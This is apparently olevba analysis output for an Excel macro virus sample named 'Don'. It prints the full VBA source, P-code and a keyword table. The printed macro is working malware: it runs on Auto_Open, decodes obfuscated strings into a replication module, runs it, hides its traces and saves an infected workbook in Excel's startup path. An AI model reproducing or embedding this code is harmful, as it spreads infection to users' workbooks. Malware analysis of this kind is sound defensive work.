olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Don
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DON.bas 
in file: ./Virus.MSExcel.Don - OLE stream: '_VBA_PROJECT_CUR/VBA/DON'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim DON$(48)

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Dim k0$, j0$, a0$, b0$
Dim mo As Module
Set w = Application.ActiveWorkbook
Open "\DON2.txt" For Output As #1
Print #1, w.Name
Close #1: a0$ = ActiveWorkbook.Path
b0$ = Application.StartupPath
ChDir b0$: dat0$ = Dir(b0$ + "\" + "*.don"): ChDir a0$
If w.Name = dat0$ Then
    Application.OnSheetDeactivate = Workbooks(dat0$).Name & "!DON.Auto_Open"
End If
Application.ScreenUpdating = False
Windows(dat0$).Visible = True
DON$(0) = "Øúç¥×êõñîèæùê¶­®"
DON$(1) = "Ôó¥Ê÷÷ô÷¥×êøúòê¥Óêýù"
DON$(2) = "Éîò¥é©±¥ê©±¥Ó©±¥í©±¥ð©±¥éæù©±¥æ¶©±¥æ·©"
DON$(3) = "Øêù¥æ¥Â¥Æõõñîèæùîôó³ÆèùîûêÜô÷ðçôôð"
DON$(4) = "æ·©¥Â¥Æõõñîèæùîôó³ÉêëæúñùËîñêÕæùí"
DON$(5) = "é©¥Â¥Æõõñîèæùîôó³Úøê÷Óæòê"
DON$(6) = "ê©¥Â¥Òîé©­é©±¥¶±¥¶®"
DON$(7) = "Îë¥ê©¥ÁÃ¥Èí÷©­¸·®¥Ùíêó"
DON$(8) = "¥¥óó¥Â¥×óé­®¿¥Ó©¥Â¥§á§¥°¥ÑÙ÷îò©­×Ù÷îò©­×îìíù©­Øù÷©­óó®±¥º®®®¥°¥§³éôó§¿¥í©¥Â¥×îìíù©­Ó©±¥¾®"
DON$(9) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­æ³Óæòê®³ØæûêÈôõþÆø¥Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¥°¥Ó©"
DON$(10) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø³Ôõêó¥­Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¥°¥Ó©®"
DON$(11) = "¥¥Øíêêùø­§×êõñîèæùê§®³Øêñêèù"
DON$(12) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ëæñøê"
DON$(13) = "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Éêñêùê"
DON$(14) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ù÷úê"
DON$(15) = "¥¥Üîóéôüø­í©®³Ûîøîçñê¥Â¥Ëæñøê"
DON$(16) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­í©®³Øæûê¿¥ð©¥Â¥Èí÷©­¸·®¥°¥é©"
DON$(17) = "¥¥Üîùí¥Æõõñîèæùîôó"
DON$(18) = "¥¥¥¥³Úøê÷Óæòê¥Â¥ð©"
DON$(19) = "¥¥Êóé¥Üîùí"
DON$(20) = "Êóé¥Îë"
DON$(21) = "Ôõêó¥§áÉÔÓ·³ùýù§¥Ëô÷¥Îóõúù¥Æø¥¨¶"
DON$(22) = "Ñîóê¥Îóõúù¥¨¶±¥ØíêêùÓæòê©"
DON$(23) = "Èñôøê¥¨¶"
DON$(24) = "Ëô÷¥ò¥Â¥¶¥Ùô¥Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Òôéúñêø³Èôúóù"
DON$(25) = "Îë¥Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Òôéúñêø­ò®³Óæòê¥Â¥§ÉÔÓ§¥Ùíêó"
DON$(26) = "¥¥ÉÕ¥Â¥¶"
DON$(27) = "Êóé¥Îë"
DON$(28) = "Óêýù¥ò"
DON$(29) = "Îë¥ÉÕ¥Â¥µ¥Ùíêó"
DON$(30) = "¥¥æ¶©¥Â¥Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¿¥ÈíÉî÷¥æ¶©"
DON$(31) = "¥¥éæù©¥Â¥Éî÷­æ¶©¥°¥§á§°¥§¯³éôó§®"
DON$(32) = "¥¥ÈíÉî÷©¥æ·©¿¥Üîóéôüø­ØíêêùÓæòê©®³Ûîøîçñê¥Â¥Ù÷úê¿¥Üîóéôüø­ØíêêùÓæòê©®³Æèùîûæùê"
DON$(33) = "¥¥ÆèùîûêÜô÷ðçôôð³Òôéúñêø³Æéé"
DON$(34) = "¥¥Øêù¥ù¥Â¥Æõõñîèæùîôó³ÆèùîûêØíêêù"
DON$(35) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­éæù©®³Òôéúñêø­§ÉÔÓ§®³Èôõþ¥æëùê÷¿ÂÆèùîûêÜô÷ðçôôð³Òôéúñêø­¶®"
DON$(36) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ëæñøê"
DON$(37) = "¥¥Øíêêùø­ù³Óæòê®³Øêñêèù"
DON$(38) = "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Éêñêùê"
DON$(39) = "¥¥Øíêêùø­§ÉÔÓ§®³Øêñêèù"
DON$(40) = "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Ûîøîçñê¥Â¥Ëæñøê"
DON$(41) = "¥¥Æõõñîèæùîôó³ÆèùîûêÜô÷ðçôôð³Øæûê"
DON$(42) = "¥¥Üîóéôüø­éæù©®³Æèùîûæùê¿¥Øíêêùø­§×êõñîèæùê§®³Éêñêùê"
DON$(43) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ù÷úê"
DON$(44) = "¥¥Üîóéôüø­ØíêêùÓæòê©®³Ûîøîçñê¥Â¥Ù÷úê"
DON$(45) = "Êóé¥Îë"
DON$(46) = "Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Øæûê"
DON$(47) = "Ðîññ¥§áÉÔÓ³ùýù§¿¥Ðîññ¥§áÉÔÓ·³ùýù§"
DON$(48) = "Êóé¥Øúç"
Open "\DON.txt" For Output As #1
    For X = 0 To 48
        j0$ = decrypt(DON$(X))
        Print #1, j0$
    Next X
Close #1
Modules.Add: Randomize
ActiveSheet.InsertFile Filename:="\DON.txt"
Set N = Application.ActiveSheet
Sheets(N.Name).Name = "Replicate"
For Each mo In Modules
    Run mo.Name + "!Replicate1"
Next
Application.DisplayAlerts = False
Sheets("Replicate").Select
ActiveWindow.SelectedSheets.Delete
Application.DisplayAlerts = True
Windows(dat0$).Save
Windows(dat0$).Visible = False
Application.ScreenUpdating = True
'DON by NJ [SLAM]
End Sub

Function decrypt(k0$)
Attribute decrypt.VB_ProcData.VB_Invoke_Func = " \n14"
For i = 1 To Len(k0$)
    b = Asc(Mid$(k0$, i, 1))
    If b = 121 Then b = 13
    c = b - 133
    If c < 0 Then GoTo Continue
    d0$ = d0$ + Chr$(c)
Continue:
Next i
decrypt = d0$
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     10 BOUNDSHEET : Sheet Information - Visual Basic module, hidden - DON
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle6
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle7
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle8
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle9
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle10
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle11
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle12
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle13
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle14
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle15
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle16
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Don
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/DON - 7786 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0030 
' 	VarDefn DON
' Line #2:
' Line #3:
' 	FuncDefn (Sub Auto_Open())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Dim 
' 	VarDefn k0
' 	VarDefn j0
' 	VarDefn a0
' 	VarDefn b0
' Line #6:
' 	Dim 
' 	VarDefn mo
' Line #7:
' 	SetStmt 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	Set w 
' Line #8:
' 	LitStr 0x0009 "\DON2.txt"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld w 
' 	MemLd New 
' 	PrintItemNL 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	St a0$ 
' Line #11:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St b0$ 
' Line #12:
' 	Ld b0$ 
' 	ArgsCall ChDir 0x0001 
' 	BoS 0x0000 
' 	Ld b0$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	LitStr 0x0005 "*.don"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St dat0$ 
' 	BoS 0x0000 
' 	Ld a0$ 
' 	ArgsCall ChDir 0x0001 
' Line #13:
' 	Ld w 
' 	MemLd New 
' 	Ld dat0$ 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld dat0$ 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	LitStr 0x000E "!DON.Auto_Open"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetDeactivate 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld dat0$ 
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #18:
' 	LitStr 0x0010 "Øúç¥×êõñîèæùê¶­®"
' 	LitDI2 0x0000 
' 	ArgsSt DON$ 0x0001 
' Line #19:
' 	LitStr 0x0014 "Ôó¥Ê÷÷ô÷¥×êøúòê¥Óêýù"
' 	LitDI2 0x0001 
' 	ArgsSt DON$ 0x0001 
' Line #20:
' 	LitStr 0x0026 "Éîò¥é©±¥ê©±¥Ó©±¥í©±¥ð©±¥éæù©±¥æ¶©±¥æ·©"
' 	LitDI2 0x0002 
' 	ArgsSt DON$ 0x0001 
' Line #21:
' 	LitStr 0x0022 "Øêù¥æ¥Â¥Æõõñîèæùîôó³ÆèùîûêÜô÷ðçôôð"
' 	LitDI2 0x0003 
' 	ArgsSt DON$ 0x0001 
' Line #22:
' 	LitStr 0x0021 "æ·©¥Â¥Æõõñîèæùîôó³ÉêëæúñùËîñêÕæùí"
' 	LitDI2 0x0004 
' 	ArgsSt DON$ 0x0001 
' Line #23:
' 	LitStr 0x0019 "é©¥Â¥Æõõñîèæùîôó³Úøê÷Óæòê"
' 	LitDI2 0x0005 
' 	ArgsSt DON$ 0x0001 
' Line #24:
' 	LitStr 0x0013 "ê©¥Â¥Òîé©­é©±¥¶±¥¶®"
' 	LitDI2 0x0006 
' 	ArgsSt DON$ 0x0001 
' Line #25:
' 	LitStr 0x0016 "Îë¥ê©¥ÁÃ¥Èí÷©­¸·®¥Ùíêó"
' 	LitDI2 0x0007 
' 	ArgsSt DON$ 0x0001 
' Line #26:
' 	LitStr 0x0059 "¥¥óó¥Â¥×óé­®¿¥Ó©¥Â¥§á§¥°¥ÑÙ÷îò©­×Ù÷îò©­×îìíù©­Øù÷©­óó®±¥º®®®¥°¥§³éôó§¿¥í©¥Â¥×îìíù©­Ó©±¥¾®"
' 	LitDI2 0x0008 
' 	ArgsSt DON$ 0x0001 
' Line #27:
' 	LitStr 0x0047 "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­æ³Óæòê®³ØæûêÈôõþÆø¥Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¥°¥Ó©"
' 	LitDI2 0x0009 
' 	ArgsSt DON$ 0x0001 
' Line #28:
' 	LitStr 0x003B "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø³Ôõêó¥­Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¥°¥Ó©®"
' 	LitDI2 0x000A 
' 	ArgsSt DON$ 0x0001 
' Line #29:
' 	LitStr 0x001C "¥¥Øíêêùø­§×êõñîèæùê§®³Øêñêèù"
' 	LitDI2 0x000B 
' 	ArgsSt DON$ 0x0001 
' Line #30:
' 	LitStr 0x0023 "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ëæñøê"
' 	LitDI2 0x000C 
' 	ArgsSt DON$ 0x0001 
' Line #31:
' 	LitStr 0x0024 "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Éêñêùê"
' 	LitDI2 0x000D 
' 	ArgsSt DON$ 0x0001 
' Line #32:
' 	LitStr 0x0022 "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ù÷úê"
' 	LitDI2 0x000E 
' 	ArgsSt DON$ 0x0001 
' Line #33:
' 	LitStr 0x001D "¥¥Üîóéôüø­í©®³Ûîøîçñê¥Â¥Ëæñøê"
' 	LitDI2 0x000F 
' 	ArgsSt DON$ 0x0001 
' Line #34:
' 	LitStr 0x0034 "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­í©®³Øæûê¿¥ð©¥Â¥Èí÷©­¸·®¥°¥é©"
' 	LitDI2 0x0010 
' 	ArgsSt DON$ 0x0001 
' Line #35:
' 	LitStr 0x0012 "¥¥Üîùí¥Æõõñîèæùîôó"
' 	LitDI2 0x0011 
' 	ArgsSt DON$ 0x0001 
' Line #36:
' 	LitStr 0x0012 "¥¥¥¥³Úøê÷Óæòê¥Â¥ð©"
' 	LitDI2 0x0012 
' 	ArgsSt DON$ 0x0001 
' Line #37:
' 	LitStr 0x000A "¥¥Êóé¥Üîùí"
' 	LitDI2 0x0013 
' 	ArgsSt DON$ 0x0001 
' Line #38:
' 	LitStr 0x0006 "Êóé¥Îë"
' 	LitDI2 0x0014 
' 	ArgsSt DON$ 0x0001 
' Line #39:
' 	LitStr 0x0020 "Ôõêó¥§áÉÔÓ·³ùýù§¥Ëô÷¥Îóõúù¥Æø¥¨¶"
' 	LitDI2 0x0015 
' 	ArgsSt DON$ 0x0001 
' Line #40:
' 	LitStr 0x0019 "Ñîóê¥Îóõúù¥¨¶±¥ØíêêùÓæòê©"
' 	LitDI2 0x0016 
' 	ArgsSt DON$ 0x0001 
' Line #41:
' 	LitStr 0x0008 "Èñôøê¥¨¶"
' 	LitDI2 0x0017 
' 	ArgsSt DON$ 0x0001 
' Line #42:
' 	LitStr 0x003C "Ëô÷¥ò¥Â¥¶¥Ùô¥Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Òôéúñêø³Èôúóù"
' 	LitDI2 0x0018 
' 	ArgsSt DON$ 0x0001 
' Line #43:
' 	LitStr 0x0041 "Îë¥Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Òôéúñêø­ò®³Óæòê¥Â¥§ÉÔÓ§¥Ùíêó"
' 	LitDI2 0x0019 
' 	ArgsSt DON$ 0x0001 
' Line #44:
' 	LitStr 0x0008 "¥¥ÉÕ¥Â¥¶"
' 	LitDI2 0x001A 
' 	ArgsSt DON$ 0x0001 
' Line #45:
' 	LitStr 0x0006 "Êóé¥Îë"
' 	LitDI2 0x001B 
' 	ArgsSt DON$ 0x0001 
' Line #46:
' 	LitStr 0x0006 "Óêýù¥ò"
' 	LitDI2 0x001C 
' 	ArgsSt DON$ 0x0001 
' Line #47:
' 	LitStr 0x000E "Îë¥ÉÕ¥Â¥µ¥Ùíêó"
' 	LitDI2 0x001D 
' 	ArgsSt DON$ 0x0001 
' Line #48:
' 	LitStr 0x002A "¥¥æ¶©¥Â¥Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¿¥ÈíÉî÷¥æ¶©"
' 	LitDI2 0x001E 
' 	ArgsSt DON$ 0x0001 
' Line #49:
' 	LitStr 0x0020 "¥¥éæù©¥Â¥Éî÷­æ¶©¥°¥§á§°¥§¯³éôó§®"
' 	LitDI2 0x001F 
' 	ArgsSt DON$ 0x0001 
' Line #50:
' 	LitStr 0x004E "¥¥ÈíÉî÷©¥æ·©¿¥Üîóéôüø­ØíêêùÓæòê©®³Ûîøîçñê¥Â¥Ù÷úê¿¥Üîóéôüø­ØíêêùÓæòê©®³Æèùîûæùê"
' 	LitDI2 0x0020 
' 	ArgsSt DON$ 0x0001 
' Line #51:
' 	LitStr 0x001C "¥¥ÆèùîûêÜô÷ðçôôð³Òôéúñêø³Æéé"
' 	LitDI2 0x0021 
' 	ArgsSt DON$ 0x0001 
' Line #52:
' 	LitStr 0x0021 "¥¥Øêù¥ù¥Â¥Æõõñîèæùîôó³ÆèùîûêØíêêù"
' 	LitDI2 0x0022 
' 	ArgsSt DON$ 0x0001 
' Line #53:
' 	LitStr 0x0052 "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­éæù©®³Òôéúñêø­§ÉÔÓ§®³Èôõþ¥æëùê÷¿ÂÆèùîûêÜô÷ðçôôð³Òôéúñêø­¶®"
' 	LitDI2 0x0023 
' 	ArgsSt DON$ 0x0001 
' Line #54:
' 	LitStr 0x0023 "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ëæñøê"
' 	LitDI2 0x0024 
' 	ArgsSt DON$ 0x0001 
' Line #55:
' 	LitStr 0x0017 "¥¥Øíêêùø­ù³Óæòê®³Øêñêèù"
' 	LitDI2 0x0025 
' 	ArgsSt DON$ 0x0001 
' Line #56:
' 	LitStr 0x0024 "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Éêñêùê"
' 	LitDI2 0x0026 
' 	ArgsSt DON$ 0x0001 
' Line #57:
' 	LitStr 0x0016 "¥¥Øíêêùø­§ÉÔÓ§®³Øêñêèù"
' 	LitDI2 0x0027 
' 	ArgsSt DON$ 0x0001 
' Line #58:
' 	LitStr 0x002D "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Ûîøîçñê¥Â¥Ëæñøê"
' 	LitDI2 0x0028 
' 	ArgsSt DON$ 0x0001 
' Line #59:
' 	LitStr 0x0021 "¥¥Æõõñîèæùîôó³ÆèùîûêÜô÷ðçôôð³Øæûê"
' 	LitDI2 0x0029 
' 	ArgsSt DON$ 0x0001 
' Line #60:
' 	LitStr 0x0034 "¥¥Üîóéôüø­éæù©®³Æèùîûæùê¿¥Øíêêùø­§×êõñîèæùê§®³Éêñêùê"
' 	LitDI2 0x002A 
' 	ArgsSt DON$ 0x0001 
' Line #61:
' 	LitStr 0x0022 "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ù÷úê"
' 	LitDI2 0x002B 
' 	ArgsSt DON$ 0x0001 
' Line #62:
' 	LitStr 0x0024 "¥¥Üîóéôüø­ØíêêùÓæòê©®³Ûîøîçñê¥Â¥Ù÷úê"
' 	LitDI2 0x002C 
' 	ArgsSt DON$ 0x0001 
' Line #63:
' 	LitStr 0x0006 "Êóé¥Îë"
' 	LitDI2 0x002D 
' 	ArgsSt DON$ 0x0001 
' Line #64:
' 	LitStr 0x0026 "Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Øæûê"
' 	LitDI2 0x002E 
' 	ArgsSt DON$ 0x0001 
' Line #65:
' 	LitStr 0x0021 "Ðîññ¥§áÉÔÓ³ùýù§¿¥Ðîññ¥§áÉÔÓ·³ùýù§"
' 	LitDI2 0x002F 
' 	ArgsSt DON$ 0x0001 
' Line #66:
' 	LitStr 0x0007 "Êóé¥Øúç"
' 	LitDI2 0x0030 
' 	ArgsSt DON$ 0x0001 
' Line #67:
' 	LitStr 0x0008 "\DON.txt"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #68:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0030 
' 	For 
' Line #69:
' 	Ld X 
' 	ArgsLd DON$ 0x0001 
' 	ArgsLd decrypt 0x0001 
' 	St j0$ 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld j0$ 
' 	PrintItemNL 
' Line #71:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	Ld Modules 
' 	ArgsMemCall Add 0x0000 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #74:
' 	LitStr 0x0008 "\DON.txt"
' 	ParamNamed Filename 
' 	Ld ActiveSheet 
' 	ArgsMemCall InsertFile 0x0001 
' Line #75:
' 	SetStmt 
' 	Ld Application 
' 	MemLd ActiveSheet 
' 	Set N 
' Line #76:
' 	LitStr 0x0009 "Replicate"
' 	Ld N 
' 	MemLd New 
' 	ArgsLd Sheets 0x0001 
' 	MemSt New 
' Line #77:
' 	StartForVariable 
' 	Ld mo 
' 	EndForVariable 
' 	Ld Modules 
' 	ForEach 
' Line #78:
' 	Ld mo 
' 	MemLd New 
' 	LitStr 0x000B "!Replicate1"
' 	Add 
' 	ArgsCall Run 0x0001 
' Line #79:
' 	StartForVariable 
' 	Next 
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #81:
' 	LitStr 0x0009 "Replicate"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #82:
' 	Ld ActiveWindow 
' 	MemLd SelectedSheets 
' 	ArgsMemCall Delete 0x0000 
' Line #83:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #84:
' 	Ld dat0$ 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld dat0$ 
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #86:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #87:
' 	QuoteRem 0x0000 0x0010 "DON by NJ [SLAM]"
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Function decrypt(k0))
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld k0$ 
' 	FnLen 
' 	For 
' Line #92:
' 	Ld k0$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St B 
' Line #93:
' 	Ld B 
' 	LitDI2 0x0079 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000D 
' 	St B 
' 	EndIf 
' Line #94:
' 	Ld B 
' 	LitDI2 0x0085 
' 	Sub 
' 	St c 
' Line #95:
' 	Ld c 
' 	LitDI2 0x0000 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Continue 
' 	EndIf 
' Line #96:
' 	Ld d0$ 
' 	Ld c 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d0$ 
' Line #97:
' 	Label Continue 
' Line #98:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	Ld d0$ 
' 	St decrypt 
' Line #100:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

